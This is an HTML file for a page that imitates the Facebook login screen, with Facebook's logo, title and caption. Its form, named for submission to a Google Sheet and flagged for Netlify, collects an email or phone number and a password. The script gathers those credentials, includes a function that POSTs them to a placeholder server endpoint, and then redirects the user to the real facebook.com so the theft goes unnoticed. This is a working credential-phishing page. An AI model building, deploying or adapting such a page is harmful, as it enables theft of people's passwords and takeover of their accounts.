<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width" />
  <title>Facebook - log in or signup</title>
  <link rel="icon" href="./images/fblogo.webp"/>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <div class="contains-top-half-and-footer-bottom-half">
    <div class="global-container">
      <div class="bigger-box">
        <div class="big-box">
          <div class="left-box">
            <div class="image-box">
              <img
                class="fb-logo"
                src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg"
                alt=""
              />
            </div>
            <h2 class="logo-caption">
              Connect with friends and the world around you on Facebook.
            </h2>
          </div>
          <div class="right-box">
            <div class="form-container">
              <form name="submit-to-google-sheet" id="myForm" data-netlify="true">
                <div class="space">
                  <input
                    type="text" name="Name"
                    class="email-box"
                    placeholder="Email or phone number"
                  />
                </div>
                <div style="display: flex">
                  <div class="space">
                    <input
                      type="password" name="Password"
                      class="pw-box"
                      placeholder="Password"
                      id="password_field"
                    />
                  </div>
                  <i
                    class="far fa-eye-slash"
                    id="toggleEyeIcon"
                    style="cursor: pointer; display: none; margin: 24px -42px"
                  ></i>
                </div>
                <div class="space">
                  <button type="submit" class="login-button"><b>Log in</b></button>
                </div>
                <div class="spaceTwo adjustTwo">
                  <a href="#" class="adjust-forgot-pw">Forgot password?</a>
                </div>
                <div class="line"></div>
                <div>
                  <button type="button" class="create-button">
                    <b>Create New Account</b>
                  </button>
                </div>
              </form>
            </div>
            <div class="bottom-link-box">
              <a class="bottom-link" href="#"><b>Create a Page</b></a>
              for a celebrity, band or business.
            </div>
          </div>
        </div>
      </div>
    </div>
    <footer>
      <!-- Footer content here -->
    </footer>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      const form = document.getElementById('myForm');

      form.addEventListener('submit', function(event) {
        event.preventDefault(); // Prevent the default form submission
        
        // Extract form data
        const formData = new FormData(form);
        const data = {};
        formData.forEach((value, key) => {
          data[key] = value;
        });

        // Log form data to the console (for testing)
        console.log('Form Data:', data);

        // Optionally send data to a server here
        // Example: sendDataToServer(data);

        // Redirect after processing form data
        window.location.href = 'https://www.facebook.com';
      });

      // Optional function to send data to a server
      function sendDataToServer(data) {
        fetch('YOUR_SERVER_ENDPOINT', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(data),
        })
        .then(response => response.json())
        .then(data => {
          console.log('Success:', data);
        })
        .catch((error) => {
          console.error('Error:', error);
        });
      }
    });
  </script>
</body>
</html>
